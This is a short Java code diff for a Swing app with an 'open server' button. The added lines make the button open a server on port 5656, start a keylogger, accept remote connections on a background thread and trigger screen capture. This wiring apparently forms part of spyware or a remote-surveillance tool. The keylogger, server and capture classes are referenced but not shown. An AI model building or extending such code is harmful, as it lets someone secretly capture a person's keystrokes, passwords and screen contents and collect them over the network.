@@ -7,6 +7,8 @@ import javax.swing.WindowConstants;
 
 public class AppDesign extends JFrame {
     JButton startButton = new JButton("Mở server");
+    Server server = new Server();
+    KeyLogger keyLogger;
 
     AppDesign() {
         setSize(400, 300);
@@ -21,11 +23,20 @@ public class AppDesign extends JFrame {
         startButton.setBounds(100, 25, 200, 200);
         startButton.addActionListener(new ActionListener() {
             public void actionPerformed(ActionEvent e) {
+                server.OpenServer(5656);
+                System.out.println("IP: " + server.ShowIP());
                 System.out.println("Start");
-                KeyLogger keyLogger = new KeyLogger();
+                keyLogger = new KeyLogger();
                 startButton.setEnabled(false);
+                Thread thread = new Thread() {
+                    public void run() {
+                        server.AcceptConnection();
+                    }
+                };
+                thread.start();
             }
         });
+        startButton.addActionListener(new ScreenCapture());
         add(startButton);
     }
 }
